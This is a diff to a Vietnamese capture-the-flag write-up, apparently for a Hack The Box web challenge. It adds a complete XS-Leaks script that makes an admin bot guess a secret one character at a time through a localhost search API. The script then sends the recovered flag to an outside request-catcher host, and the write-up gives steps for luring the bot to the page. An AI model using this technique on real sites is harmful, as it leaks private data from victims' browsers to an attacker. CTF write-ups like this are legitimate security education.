@@ -237,11 +237,44 @@ Lợi dụng điều này, khi ta sử dụng XS-Leaks nó sẽ sử dụng các
 
 Vector: ta sẽ tạo một trang web chứa một đoạn script thực hiện XS-Leaks và có chức năng gửi lại kết quả cho mình -> gửi link chứa trang web này cho con bot -> bot truy cập link -> script thực hiện trên con bot với ip localhost (`isLocalhost(req)=0` -> `approved=0`) -> bot gửi request và brute-force từng ký tự Flag tại chức năng `Search Query` -> Sau khi brute-force xong, bot gửi lại flag cho mình
 
-Script (by skelter)
+Script 
+
+```
+<html>
+<script>
+var ip = '127.0.0.1:1337'; // Only IP
+var myWeb = 'https://duypt.requestcatcher.com'; //URL để lấy flag
+var flag = 'HTB';
+var chars = '!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
+var url = `http://${ip}/api/entries/search?q=`
+
+async function getPartialFlag(char){ //Hàm thực hiện gửi request tới url để xem có lỗi hay không
+ return new Promise((resolve, reject)=>{
+ const script = document.createElement("script");
+ script.src = url+encodeURIComponent(flag+char);
+ script.onload = () => char==='}' ? reject(char):resolve(char); //Nếu thành công (200) sẽ thực hiện
+ script.onerror = () => reject(char); //Nếu không thành công (404) sẽ thực hiện
+ document.head.appendChild(script);
+ });
+}
+async function getFlag(chars) {  //Hàm thực hiện brute-force flag
+ var b = false; 
+ for(var i=0; i < chars.length; i++){
+    await getPartialFlag(chars[i]).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } ); //Thực hiện ghép flag, nếu là ký tự cuối cùng ('}') gán b=True để break
+    if(b) break;
+}
+ fetch(`${myWeb}/flag=${flag}`, {method:'get'}); // Thực hiện trả về kết quả cho hacker 
+};
+getFlag(chars);
+</script>
+<html>
 
 ```
 
-```
+Mọi người cần built một web để máy bên HTB có thể truy cập vào được, ở đây mình dùng apache + ngrok
 
+Thực hiện gửi link web của mình vào chức năng `Report Abusive Content By Humans` 
 
+![image](https://user-images.githubusercontent.com/86275419/228696618-1cfcbab7-f971-4292-98a7-c5eb356498a6.png)
 
+Giờ ta chỉ ngồi đợi Flag về thôi
